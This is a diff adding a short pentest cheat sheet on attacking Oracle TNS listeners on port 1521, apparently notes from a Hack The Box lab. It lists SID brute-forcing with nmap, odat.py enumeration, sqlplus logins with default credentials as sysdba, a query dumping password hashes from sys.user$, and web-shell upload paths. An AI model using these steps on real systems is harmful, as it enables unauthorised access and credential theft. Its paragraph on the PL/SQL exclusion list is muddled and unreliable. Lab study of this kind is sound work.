@@ -1,0 +1,52 @@
+                -----tcp port 1521
+
+
+
+The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the Oracle Net Services software suite, TNS supports various networking protocols between Oracle databases and client applications, such as IPX/SPX and TCP/IP protocol stacks.The TNS listener is configured to support various network protocols, including TCP/IP, UDP, IPX/SPX, and AppleTalk.
+
+
+Oracle databases can be protected by using so-called PL/SQL Exclusion List (PlsqlExclusionList). It is a user-created text file that needs to be placed in the $ORACLE_HOME/sqldeveloper directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.
+
+
+        brute force tns sid`s
+    $ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+
+
+We can use the odat.py tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the all option and try all modules of the odat.py tool.
+
+
+    $ ./odat.py all -s 10.129.204.235
+
+
+
+                SQLplus - Log In
+
+    $ sqlplus username/password@x.x.x.x/XE;
+    $ sqlplus scott/tiger@10.129.204.235/XE as sysdba
+
+
+    !!!!!
+If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below, taken from here.
+                
+                SQLplus - Log In
+
+Gkaranikas@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+
+There are many SQLplus commands that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:
+
+                    Oracle RDBMS - Interaction
+
+    SQL> select table_name from all_tables;
+
+    SQL> select name, password from sys.user$;
+
+
+Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:
+  
+    OS 	        Path
+    Linux 	    /var/www/html
+    Windows 	C:\inetpub\wwwroot
+
+
+
+
